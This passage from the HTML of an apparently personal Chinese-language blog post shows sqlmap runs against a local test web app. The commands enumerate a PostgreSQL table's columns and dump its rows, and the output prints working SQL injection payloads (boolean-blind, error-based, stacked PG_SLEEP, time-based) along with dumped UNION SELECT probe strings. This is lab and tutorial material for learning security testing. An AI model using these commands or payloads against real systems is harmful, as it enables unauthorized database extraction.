+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8090/start/filter2?strings=ZAP&#34;</span> --dbms<span style="color:#f92672">=</span>postgresql --batch -D public -T ex100 --columns
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>       __H__
+</span></span><span style="display:flex;"><span> ___ ___<span style="color:#f92672">[</span>,<span style="color:#f92672">]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.7.2#stable<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>|_ -| . <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;]     | .&#39;</span>| . |
+</span></span><span style="display:flex;"><span>|___|_  <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_|_|_|__,|  _|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] starting @ 00:27:26 /2024-08-18/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:27:26] [INFO] testing connection to the target URL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sqlmap resumed the following injection point(s) from stored session:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Parameter: strings (GET)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: boolean-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39; AND 1463=1463 AND &#39;jWFI&#39;=&#39;jWFI
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: error-based
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39; AND 1706=CAST((CHR(113)||CHR(98)||CHR(120)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (1706=1706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND &#39;mGGj&#39;=&#39;mGGj
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: stacked queries
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39;;SELECT PG_SLEEP(5)--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: time-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: PostgreSQL &gt; 8.1 AND time-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39; AND 3963=(SELECT 3963 FROM PG_SLEEP(5)) AND &#39;nMkI&#39;=&#39;nMkI
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/*中間省略*/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Database: public
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Table: ex100
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[12 columns]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+------------------+-----------+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Column           | Type      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+------------------+-----------+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| version          | int4      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| article          | text      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| atms             | int4      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| date_created     | timestamp |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| integers         | int4      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| last_updated     | timestamp |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| man_created      | varchar   |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| man_last_updated | varchar   |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| note             | varchar   |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| objid            | numeric   |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| status           | int4      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| strings          | varchar   |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+------------------+-----------+
+</span></span></span></code></pre></div><h4 id="5-取得實際資料內容">5. 取得實際資料內容</h4>
+<h5 id="指令-4">指令</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8090/start/filter2?strings=ZAP&#34;</span> --dbms<span style="color:#f92672">=</span>postgresql --batch -D public -T ex100 -C strings,status --dump
+</span></span></code></pre></div><h5 id="結果-4">結果</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8090/start/filter2?strings=ZAP&#34;</span> --dbms<span style="color:#f92672">=</span>postgresql --batch -D public -T ex100 -C strings,status --dump
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>       __H__
+</span></span><span style="display:flex;"><span> ___ ___<span style="color:#f92672">[</span>,<span style="color:#f92672">]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.7.2#stable<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>|_ -| . <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;]     | .&#39;</span>| . |
+</span></span><span style="display:flex;"><span>|___|_  <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_|_|_|__,|  _|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] starting @ 00:28:34 /2024-08-18/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:28:34] [INFO] testing connection to the target URL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sqlmap resumed the following injection point(s) from stored session:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Parameter: strings (GET)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: boolean-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39; AND 1463=1463 AND &#39;jWFI&#39;=&#39;jWFI
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: error-based
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39; AND 1706=CAST((CHR(113)||CHR(98)||CHR(120)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (1706=1706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND &#39;mGGj&#39;=&#39;mGGj
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: stacked queries
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39;;SELECT PG_SLEEP(5)--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: time-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: PostgreSQL &gt; 8.1 AND time-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: strings=ZAP&#39; AND 3963=(SELECT 3963 FROM PG_SLEEP(5)) AND &#39;nMkI&#39;=&#39;nMkI
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:28:34] [INFO] testing PostgreSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:28:34] [INFO] confirming PostgreSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:28:34] [INFO] the back-end DBMS is PostgreSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">back-end DBMS: PostgreSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[00:28:34] [INFO] fetching entries of column(s) &#39;status,strings&#39; for table &#39;ex100&#39; in database &#39;public&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Database: public
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Table: ex100
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[305 entries]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+----------------------------------------------------+--------+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| strings                                            | status |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+----------------------------------------------------+--------+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| NULL                                               | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -  | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP) UNION ALL SELECT NULL,NULL#                   | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP UNION ALL SELECT NULL,NULL,NULL#               | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP&#39; UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#    | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP%&#39; ORDER BY 1#                                  | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP%&#39; UNION ALL SELECT NULL#                       | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP%&#39; UNION ALL SELECT NULL,NULL#                  | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP%&#39; UNION ALL SELECT NULL,NULL,NULL#             | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP%&#39; UNION ALL SELECT NULL,NULL,NULL,NULL#        | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP%&#39; UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#   | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP ORDER BY 1#                                    | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP UNION ALL SELECT NULL#                         | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP UNION ALL SELECT NULL,NULL#                    | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP UNION ALL SELECT NULL,NULL,NULL#               | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP UNION ALL SELECT NULL,NULL,NULL,NULL#          | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#     | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ZAP                                                | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| #javascript:alert(5397)                            | 0      |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+----------------------------------------------------+--------+
+</span></span></span></code></pre></div><h2 id="參考資料">參考資料</h2>
+<ul>
+<li><a href="https://hackmd.io/@bttea/sqlmap_common_parameters">SQLmap 基本使用</a></li>
+</ul>
+</div>
+                <div>
+                    <script src="https://utteranc.es/client.js"
+                        repo="PolloChang/commentsforpollochang"
+                        issue-term="pathname"
+                        theme="github-light"
+                        crossorigin="anonymous"
+                        async>
+                    </script>
+                </div>
+            </div>
+        </div>
+
+        <div class="layui-col-md4 layui-col-sm12 layui-col-xs12">
+            
+            <div class="layui-card single-card">
+                <h2 class="single-title">Relevant Topics</h2>
+                
+                	
+                    <div style="margin-left: 10px;">
+                        <blockquote class="self-elem-quote self-elem-quote-bg-cyan" style="background-color:#FFFFFF;margin-top: 10px;">
+                            <a href="/twgcb/db-schema/">
+                                <h3 class="">TWGCB 資料庫建立腳本</h3>
+                            </a>
+                            
+                            <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2024-04-06</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/twgcb/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">TWGCB</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/twgcb/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">TWGCB</span>
+        </a>
+    
+        <a href="/tags/%e8%b3%87%e5%ae%89/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">資安</span>
+        </a>
+    
+    
+</h3>
+
+                        </blockquote>
+                    </div>
+                	
+                
+                <br />
+            </div>
+            
+
+            <div class="layui-card single-card">
+                <h2 class="single-title">Recent Posts</h2>
+            
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote self-elem-quote-bg-cyan" style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/cns11643/">
+                        <h3 class="">CNS11643 轉 UTF8 經驗</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2024-03-21</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/%e5%b7%a5%e4%bd%9c%e9%9b%9c%e8%a8%98/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">工作雜記</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/cns11643/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">CNS11643</span>
+        </a>
+    
+        <a href="/tags/java/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">Java</span>
+        </a>
+    
+    
+</h3>
+
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote self-elem-quote-bg-cyan" style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/db-postgresql-note/">
+                        <h3 class="">db-postgresql-note</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2024-03-15</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/%e5%b7%a5%e4%bd%9c%e9%9b%9c%e8%a8%98/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">工作雜記</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/postgresql/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">postgresql</span>
+        </a>
+    
+    
+</h3>
+
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote self-elem-quote-bg-cyan" style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/docker-note/">
+                        <h3 class="">docker-note</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2024-03-15</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/%e5%b7%a5%e4%bd%9c%e9%9b%9c%e8%a8%98/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">工作雜記</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/docker/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">docker</span>
+        </a>
+    
+    
+</h3>
+
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote self-elem-quote-bg-cyan" style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/2024-02-28-%E9%97%9C%E9%96%89ipv6/">
+                        <h3 class="">關閉IPv6</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2024-02-28</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/%e5%b7%a5%e4%bd%9c%e9%9b%9c%e8%a8%98/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">工作雜記</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/linux/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">Linux</span>
+        </a>
+    
+    
+</h3>
+
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote self-elem-quote-bg-cyan" style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/2024-02-28-%E8%BC%B8%E5%85%A5%E6%B3%95%E7%9B%B8%E9%97%9C/">
+                        <h3 class="">輸入法相關</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2024-02-28</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/%e5%b7%a5%e4%bd%9c%e9%9b%9c%e8%a8%98/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">工作雜記</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/linux/">
+            <span class="layui-badge layui-bg-green" style="vertical-align: 2px;">Linux</span>
+        </a>
+    
+    
+</h3>
+
+                    </blockquote>
+                </div>
+                
+            
+            <br />
+            </div>
+        </div>
+
+    </div>
+</div>
+
+
+        </div><footer>
+    
+    
+    <div class="layui-container">
+        <p class="copyright">Copyright © 2024-2024, PolloChang; all rights reserved.</p>
+    </div>
+</footer>
+
+</body>
+</html>
